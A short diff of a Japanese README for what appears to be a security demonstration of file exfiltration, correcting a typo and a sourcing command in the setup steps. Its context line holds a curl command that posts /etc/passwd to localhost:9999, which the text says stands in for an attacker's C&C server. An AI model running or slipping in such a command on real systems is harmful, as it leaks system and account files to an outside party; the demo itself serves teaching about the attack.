@@ -15,14 +15,14 @@ curl -X POST -F f=@"/etc/passwd" localhost:9999
 本来localhost:9999の部分は攻撃者が用意するC&Cサーバのドメイン名であるが、漏洩させるファイルを自身で受け取るためここではlocalhostとなる。
 
 ### デモの実行方法
-環境は Ubuntu 20.04 LST or 22.04 LTSで動作確認済み（WSL2でも動く）。
+環境は Ubuntu 20.04 LTS or 22.04 LTSで動作確認済み（WSL2でも動く）。
 
 ```bash
 # 依存関係をインストール（初回のみ）
 ./setup.sh
 
 # 環境変数(PIN_ROOT)を設定
-source ./env.init
+source env.init
 
 # POSTリクエストを受け取るHTTPサーバを起動
 python3 server.py &
